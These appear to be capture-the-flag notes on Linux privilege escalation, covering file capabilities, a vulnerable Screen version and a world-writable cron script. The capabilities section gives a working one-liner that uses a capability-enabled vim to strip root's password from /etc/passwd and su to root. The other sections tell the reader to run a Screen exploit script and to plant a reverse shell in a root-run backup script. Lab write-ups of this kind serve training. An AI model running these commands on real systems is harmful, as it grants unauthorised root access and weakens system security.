##### Capabilities
find exploitible capabilities
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

look for cap_dac_override+eip which grants full

we find /usr/bin/vim.basic which shows as exploitible. Lets use that to edit passwd to remove "x" and allow for any user to su to root account.
su to root and cat the flag.txt

{flag found}

one liner:

find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; | grep cap_dac_override+eip | awk '{print $1}' | if [[ "$(awk '{print $1}')" == *"vim.basic"* ]]; then (echo "before" && cat /etc/passwd | head -n1 && echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd && echo "after" && cat /etc/passwd | head -n1) else (echo "FAILED CONDITION") fi && su -c "cat flag.txt" -l root

##### Vulnerable Services
check screen version
screen -v

use Screen_Exploit_POC.sh file to have sh access. cat the flag at /root/screen_exploit/flag.txt


##### Cron abuse
run to find 
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

found /dmz-backups/backup.sh which is ran by root and globally editible
change file to include reverse shell or other exploit to grant root perms
